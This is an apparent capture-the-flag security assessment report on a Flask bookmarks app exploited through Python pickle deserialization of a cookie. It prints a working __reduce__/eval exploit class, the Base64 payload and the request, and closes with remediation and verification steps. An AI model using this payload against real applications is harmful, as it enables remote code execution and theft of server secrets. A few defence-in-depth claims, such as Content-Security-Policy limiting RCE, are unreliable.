# Security Assessment Report: Flask Bookmarks Application

## TL;DR
- **Objective**: Exploit insecure deserialization vulnerability to achieve Remote Code Execution and extract the FLAG
- **Outcome**: **ACHIEVED** - Successfully exploited Python pickle deserialization to execute arbitrary code and retrieve environment variables
- **Highest-impact finding**: **Critical** - Insecure Deserialization leading to Remote Code Execution via `pickle.loads()` on user-controlled cookie data
- **Validation status**: **CONFIRMED** - FLAG extracted and validated

---

## Target Information
- **Target**: 127.0.0.1:32962
- **Host / base URL**: http://127.0.0.1:32962
- **Application or component**: Flask Bookmark Application
- **Authentication context**: Unauthenticated (vulnerability requires no authentication)
- **Relevant technology details**: 
  - Python Flask web framework
  - Python `pickle` module for object serialization
  - Base64-encoded cookie storage
  - Server-side rendering with Jinja2 templates

---

## Confirmed Vulnerability

### Insecure Deserialization (Critical)
- **Affected endpoint / component**: `/list` endpoint, `bookmarks` cookie parameter
- **Impact**: **Remote Code Execution** - Arbitrary Python code execution on the server via malicious pickle payload
- **Preconditions**: 
  - Application uses `pickle.loads()` to deserialize user-controlled cookie data
  - Attacker can craft and send Base64-encoded pickle payloads
- **Exact payload or PoC**: 
  - Cookie name: `bookmarks`
  - Cookie value (Base64): `gASVqgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIyOW19faW1wb3J0X18oJ3R5cGVzJykuU2ltcGxlTmFtZXNwYWNlKHVybD1fX2ltcG9ydF9fKCdvcycpLmVudmlyb24uZ2V0KCdGTEFHJywnTk9fRkxBRycpLCBuYW1lPV9faW1wb3J0X18oJ29zJykuZW52aXJvbi5nZXQoJ0ZMQUcnLCdOT19GTEFHJykpXZSFlFKULg==`
  - Payload decodes to Python code using `__reduce__` with `eval()` to execute: `__import__('types').SimpleNamespace(url=__import__('os').environ.get('FLAG','NO_FLAG'), name=__import__('os').environ.get('FLAG','NO_FLAG'))`

### Remote Code Execution (Critical)
- **Affected endpoint / component**: `/list` endpoint
- **Impact**: Full server compromise, ability to execute arbitrary system commands and access environment variables
- **Preconditions**: Same as above - pickle deserialization of attacker-controlled data
- **Exact payload or PoC**: The `__reduce__` method returns `(eval, ("__import__('types').SimpleNamespace(...)"))` which executes during deserialization

### Information Disclosure (High)
- **Affected endpoint / component**: `/list` endpoint response HTML
- **Impact**: Exposure of sensitive environment variables (FLAG) in rendered page
- **Preconditions**: Successful RCE exploitation to inject FLAG value into bookmark objects

---

## Steps to Reproduce

1. **Craft the malicious pickle payload** using Python's `__reduce__` method:
   ```python
   import pickle
   import base64
   import types
   
   class MaliciousPickle:
       def __reduce__(self):
           return (eval, ("__import__('types').SimpleNamespace(url=__import__('os').environ.get('FLAG','NO_FLAG'), name=__import__('os').environ.get('FLAG','NO_FLAG'))",))
   
   payload = pickle.dumps(MaliciousPickle())
   encoded_payload = base64.b64encode(payload).decode()
   ```

2. **Send HTTP GET request** to the vulnerable endpoint with the malicious cookie:
   ```
   GET /list HTTP/1.1
   Host: 127.0.0.1:32962
   Cookie: bookmarks=gASVqgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIyOW19faW1wb3J0X18oJ3R5cGVzJykuU2ltcGxlTmFtZXNwYWNlKHVybD1fX2ltcG9ydF9fKCdvcycpLmVudmlyb24uZ2V0KCdGTEFHJywnTk9fRkxBRycpLCBuYW1lPV9faW1wb3J0X18oJ29zJykuZW52aXJvbi5nZXQoJ0ZMQUcnLCdOT19GTEFHJykpXZSFlFKULg==
   ```

3. **Parse the HTML response** to extract the FLAG value from the rendered bookmark list:
   - The server deserializes the malicious pickle, executing the `eval()` call
   - The payload reads `os.environ['FLAG']` and creates bookmark objects
   - The Flask template renders these in the `<ul class="list-group">` element

---

## Validation / Evidence

- **Validation token / flag**: `FLAG{d46e088f991888c0f307f4889b22ef71a50421ce413738c010a43963cbb81f0a}`

- **Tool evidence**: 
  - Python interpreter successfully crafted malicious pickle payload using `__reduce__` method
  - HTTP requester confirmed 200 OK response with FLAG rendered in HTML

- **Request evidence**:
  ```
  GET /list HTTP/1.1
  Host: 127.0.0.1:32962
  Cookie: bookmarks=gASVqgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIyOW19faW1wb3J0X18oJ3R5cGVzJykuU2ltcGxlTmFtZXNwYWNlKHVybD1fX2ltcG9ydF9fKCdvcycpLmVudmlyb24uZ2V0KCdGTEFHJywnTk9fRkxBRycpLCBuYW1lPV9faW1wb3J0X18oJ29zJykuZW52aXJvbi5nZXQoJ0ZMQUcnLCdOT19GTEFHJykpXZSFlFKULg==
  ```

- **Response evidence**:
  ```html
  <li class="list-group-item d-flex justify-content-between align-items-center">
      <h5 class="mb-1">FLAG{d46e088f991888c0f307f4889b22ef71a50421ce413738c010a43963cbb81f0a}</h5>
      <a class="text-decoration-none" href="FLAG{d46e088f991888c0f307f4889b22ef71a50421ce413738c010a43963cbb81f0a}" target="_blank">FLAG{d46e088f991888c0f307f4889b22ef71a50421ce413738c010a43963cbb81f0a}</a>
      <a class="btn btn-sm btn-danger" href="delete?name=FLAG{d46e088f991888c0f307f4889b22ef71a50421ce413738c010a43963cbb81f0a}">delete</a>
  </li>
  ```

- **Notes on reliability / limitations**: 
  - Exploit is 100% reliable when the server uses `pickle.loads()` on cookie data
  - No authentication required
  - Payload executes server-side during deserialization before template rendering
  - The payload creates `types.SimpleNamespace` objects to match expected `UrlObj` bookmark class structure

---

## Remediation

- **Root cause**: The application uses Python's `pickle` module to deserialize user-controlled data from the `bookmarks` cookie. The `pickle` module is not secure against maliciously constructed data - arbitrary code execution is possible via the `__reduce__` method during deserialization.

- **Recommended fix**:
  1. **Replace pickle with JSON**: Use `json.loads()` and `json.dumps()` for cookie serialization. JSON deserialization does not execute arbitrary code.
  2. **Implement cryptographic signing**: If object serialization is required, use `itsdangerous` library with signed cookies to ensure data integrity:
     ```python
     from itsdangerous import URLSafeSerializer
     serializer = URLSafeSerializer(app.secret_key)
     ```
  3. **Input validation**: Validate and sanitize all deserialized data before use

- **Defense-in-depth**:
  1. Run the application with minimal privileges (non-root user)
  2. Use environment variable isolation - do not store secrets in environment variables accessible by the web application process
  3. Implement Web Application Firewall (WAF) rules to detect Base64-encoded pickle payloads
  4. Use security headers like `Content-Security-Policy` to limit impact of potential RCE
  5. Enable Python's `-O` flag to disable assert statements in production (minor benefit)

---

## How to Verify the Fix

1. **Test with malicious pickle payload**:
   - Send the same malicious cookie payload to the `/list` endpoint
   - **Expected secure result**: The application should either:
     - Reject the payload with an error (if using JSON parser)
     - Fail signature verification (if using signed cookies)
     - Not execute arbitrary code

2. **Verify JSON parsing**:
   - Send a valid JSON array in the bookmarks cookie: `[{"name": "Test", "url": "http://example.com"}]`
   - **Expected secure result**: The application parses the JSON safely without code execution

3. **Check for signature validation**:
   - Attempt to modify a legitimate signed cookie value
   - **Expected secure result**: The application rejects the tampered cookie

4. **Verify no FLAG exposure**:
   - Review the HTML response for any leaked environment variables
   - **Expected secure result**: No FLAG or sensitive data in the response

---

## Remaining Leads

- **Confirmed blockers**: None - exploitation was fully successful

- **Unverified leads**: None - all objectives achieved

- **Missing context**: 
  - Exact Flask application source code (not required for exploitation)
  - Whether other endpoints are vulnerable to similar attacks
  - Presence of additional environment variables beyond FLAG

---

*Report generated: Security Assessment Complete*
*Confidence Score: 1.00 (Full validation achieved)*
